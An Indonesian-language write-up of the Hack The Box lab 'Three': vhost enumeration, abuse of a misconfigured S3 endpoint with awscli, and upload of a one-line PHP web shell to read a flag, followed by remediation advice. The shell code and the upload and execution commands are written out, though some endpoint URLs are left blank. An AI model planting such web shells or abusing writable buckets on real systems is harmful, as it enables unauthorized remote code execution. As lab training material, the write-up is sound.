# Write-up: Three (Hack The Box - Starting Point)

## Ringkasan
Dokumen ini merupakan catatan penetrasi (write-up) lengkap untuk modul **Three** di platform Hack The Box (HTB) Starting Point. Lab ini mencakup proses enumerasi port terbuka, penemuan subdomain (*Virtual Host*), eksploitasi layanan penyimpanan *Amazon S3* menggunakan `awscli`, hingga pengunggahan skrip web shell PHP untuk mencapai *Remote Code Execution* (RCE) dan mengambil flag dari server target.

## Tools & Lingkungan Kerja
- **Target IP:** `<IP_TARGET>` (`thetoppers.htb`)
- **Tools Utama:** 
  - **Gobuster** (Enumerasi *virtual host* / subdomain)
  - **AWS CLI** (`awscli` untuk berinteraksi dengan layanan S3 bucket target)
  - **cURL / Browser** (Pengujian eksekusi web shell dan pengambilan flag)

## Konsep Utama & Teori Dasar
1. **Virtual Host (VHost) Enumeration**: Teknik menemukan subdomain tersembunyi pada sebuah domain utama menggunakan tool fuzzing berbasis wordlist.
2. **Amazon S3 (Simple Storage Service) & Endpoint Kustom**: Layanan *cloud storage* yang dapat dieksploitasi jika salah dikonfigurasi, di mana penyerang dapat berinteraksi menggunakan CLI dengan parameter `--endpoint-url` kustom.
3. **Remote Code Execution (RCE) via Web Shell**: Mengunggah file script web (seperti PHP) ke direktori web server untuk mengeksekusi perintah sistem operasi secara langsung dari browser atau command line.

## Langkah-langkah Penetrasi (Step-by-Step)

### Tahap 1: Pemetaan Host dan Enumerasi Awal
Pengujian awal mendapati port HTTP (80) dan SSH (22) terbuka. Agar nama domain dapat diakses secara lokal tanpa server DNS, pemetaan alamat IP target ke dalam file `/etc/hosts` dilakukan:

```
<IP_TARGET> thetoppers.htb
```
Selanjutnya, pemindaian subdomain (virtual host fuzzing) dijalankan menggunakan gobuster untuk menemukan layanan tersembunyi:

```
gobuster vhost -u [http://thetoppers.htb](http://thetoppers.htb) -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
Dari proses tersebut, subdomain s3.thetoppers.htb berhasil ditemukan dan ditambahkan ke dalam file `/etc/hosts`
Tahap 2: Konfigurasi AWS CLI dan Interaksi S3 Bucket

Subdomain s3.thetoppers.htb teridentifikasi menjalankan layanan Amazon S3. Untuk berinteraksi dengan layanan tersebut, utilitas awscli digunakan. Konfigurasi kredensial awal dilakukan dengan mengisi data dummy:
```
aws configure
```
(Masukkan nilai bebas seperti test untuk Access Key & Secret Key, serta us-east-1 untuk region).

Pemeriksaan daftar bucket dilakukan untuk memverifikasi koneksi ke S3 bucket target:
Bash
```
aws s3 ls --endpoint-url 
```
Perintah ini mengonfirmasi keberadaan bucket thetoppers.htb.

### Tahap 3: Eksploitasi RCE melalui Web Shell PHP
 
Karena server web mengaktifkan pemrosesan file PHP, sebuah skrip web shell sederhana (shell.php) dibuat untuk menerima parameter eksekusi perintah:
PHP

```
<?php
echo system($_GET['cmd']);
?>
```

Skrip tersebut diunggah ke S3 bucket target menggunakan awscli:
```

aws s3 cp shell.php s3://thetoppers.htb/ --endpoint-url
```
Karena S3 bucket terhubung langsung dengan root direktori web server, file yang diunggah dapat dieksekusi secara langsung melalui web.

### Tahap 4: Pencarian dan Pengambilan Flag

Pengujian eksekusi perintah dilakukan menggunakan curl untuk membaca file flag yang terletak di direktori /var/www/flag.txt:

```
curl "http://thetoppers.htb/shell.php?cmd=cat+/var/www/flag.txt"
```

String flag berformat HTB{...} berhasil ditampilkan di terminal dan disalin untuk menyelesaikan modul.

### Kesimpulan & Rekomendasi Keamanan (Remediation)

 - Konfigurasi Akses S3 (Access Control): Pastikan S3 bucket atau layanan penyimpanan cloud dikonfigurasi dengan pembatasan hak akses yang ketat (private), tidak mengizinkan akses publik atau anonim untuk menulis (write/upload).

 - Validasi File Upload: Terapkan pembatasan jenis ekstensi file yang diizinkan untuk diunggah pada server web guna mencegah eksekusi skrip berbahaya (webshell).

 - Pemisahan Direktori Penyimpanan: Hindari menghubungkan direktori penyimpanan file eksternal (cloud storage/bucket) secara langsung ke root direktori web server eksekusi skrip.
    
